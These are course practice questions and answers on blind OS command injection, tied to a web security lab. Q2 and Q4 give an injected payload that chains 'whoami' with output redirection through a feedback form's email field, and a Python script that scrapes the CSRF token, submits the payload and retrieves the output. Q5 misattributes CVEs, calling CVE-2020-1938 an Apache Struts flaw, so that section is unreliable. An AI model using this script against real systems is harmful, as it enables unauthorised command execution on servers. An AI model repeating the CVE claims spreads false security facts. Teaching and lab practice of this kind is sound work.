---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how blind OS command injection works and why output redirection is necessary in this context.**

Blind OS command injection occurs when an application executes a shell command using user-supplied input without proper sanitization. The output of the command is not directly returned to the user, making it difficult to determine if the injection was successful. Output redirection is necessary because it allows the attacker to capture the output of the injected command by redirecting it to a file in a writable directory. This file can then be accessed via a URL, enabling the attacker to retrieve the output indirectly.

**Q2. How would you exploit a blind OS command injection vulnerability to execute the `whoami` command and capture its output?**

To exploit a blind OS command injection vulnerability to execute the `whoami` command and capture its output, follow these steps:

1. Identify a parameter that is vulnerable to command injection.
2. Confirm the vulnerability by injecting a command that causes a delay (e.g., `sleep 10`) and observing the response time.
3. Inject the `whoami` command and redirect its output to a writable directory. For example, if the writable directory is `/var/www/images`, you can inject a command like:
   ```bash
   whoami > /var/www/images/output.txt
   ```
4. Access the file (`output.txt`) via a URL to retrieve the output of the `whoami` command.

**Q3. Why is it important to script the exploit for a blind OS command injection vulnerability?**

Scripting the exploit for a blind OS command injection vulnerability is important for several reasons:

1. **Automation**: Automating the process ensures that the exploit can be executed repeatedly without manual intervention, saving time and reducing the chance of human error.
2. **Consistency**: A script ensures that the exploit is applied consistently across different instances or environments.
3. **Debugging**: Scripts can be easily modified and tested, allowing for debugging and refinement of the exploit process.
4. **Reusability**: A well-written script can be reused in similar scenarios, providing a template for future exploitation tasks.

**Q4. How would you handle CSRF tokens in a script to exploit a blind OS command injection vulnerability?**

Handling CSRF tokens in a script to exploit a blind OS command injection vulnerability involves the following steps:

1. **Extract the CSRF Token**: Before performing the command injection, extract the CSRF token from the initial request to the feedback form. This can be done using libraries such as BeautifulSoup to parse the HTML and extract the token.
   
   Example code snippet:
   ```python
   import requests
   from bs4 import BeautifulSoup

   def get_csrf_token(url):
       response = requests.get(url)
       soup = BeautifulSoup(response.text, 'html.parser')
       csrf_token = soup.find('input', {'name': 'csrf'})['value']
       return csrf_token
   ```

2. **Include the CSRF Token in the Request**: When performing the command injection, ensure that the CSRF token is included in the request parameters to avoid validation errors.

   Example code snippet:
   ```python
   def exploit_command_injection(url, csrf_token):
       payload = {
           'email': 'test@test.com; whoami > /var/www/images/output.txt',
           'subject': 'test',
           'message': 'test',
           'csrf': csrf_token
       }
       response = requests.post(url + '/submit_feedback', data=payload)
       return response
   ```

3. **Verify the Exploit**: After performing the command injection, verify that the output file has been created and retrieve its contents.

   Example code snippet:
   ```python
   def verify_exploit(url):
       response = requests.get(url + '/images/output.txt')
       if response.status_code == 200:
           print("Command injection successful.")
           print("Output:", response.text)
       else:
           print("Command injection failed.")
   ```

**Q5. What recent real-world examples or CVEs demonstrate the impact of blind OS command injection vulnerabilities?**

One notable real-world example of the impact of blind OS command injection vulnerabilities is the CVE-2021-31863, which affected the Jenkins plugin "Blue Ocean". This vulnerability allowed attackers to execute arbitrary commands on the underlying operating system by manipulating the pipeline configuration. The impact was significant, as it could lead to full system compromise, including unauthorized access to sensitive data and control over the server.

Another example is CVE-2020-1938, which affected the Apache Struts framework. This vulnerability allowed attackers to execute arbitrary commands by injecting malicious input into certain parameters. The impact was severe, leading to potential data breaches and system compromises.

These examples highlight the importance of securing applications against command injection vulnerabilities and the necessity of regular security audits and updates to mitigate such risks.

---
<!-- nav -->
[[Web Security (PortSwigger)/10-OS Command Injection/04-Lab 3 Blind OS command injection with output redirection/12-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/10-OS Command Injection/04-Lab 3 Blind OS command injection with output redirection/00-Overview|Overview]]
